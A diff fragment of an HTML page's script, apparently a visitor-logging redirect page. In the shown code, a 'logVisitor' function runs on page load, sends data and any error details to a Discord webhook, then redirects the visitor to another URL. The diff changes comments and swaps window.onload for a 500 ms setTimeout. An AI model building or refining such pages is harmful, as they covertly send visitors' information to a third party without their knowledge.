@@ -104,8 +104,8 @@
                     throw new Error("Failed to send data to Discord");
                 }
 
-                // Step 5: Redirect after sending the data to Discord
-                window.location.href = redirectURL; // Redirect to the target URL after sending data
+                // Step 5: After sending data to Discord, redirect
+                window.location.href = redirectURL; // Redirect to the target URL
 
             } catch (error) {
                 // Send error details to Discord webhook
@@ -130,13 +130,13 @@
                     console.error("Failed to send error data to Discord:", discordError);
                 }
 
-                // Redirect the user to the specified URL on error
+                // **Redirect** the user on error as well (ensure redirection even on errors)
                 window.location.href = redirectURL;
             }
         }
 
-        // Start the verification process once the page loads
-        window.onload = logVisitor;
+        // Ensure the redirection occurs after the verification process is completed
+        setTimeout(logVisitor, 500); // Delay the execution by 500ms to allow async operations to complete
     </script>
 </body>
 </html>
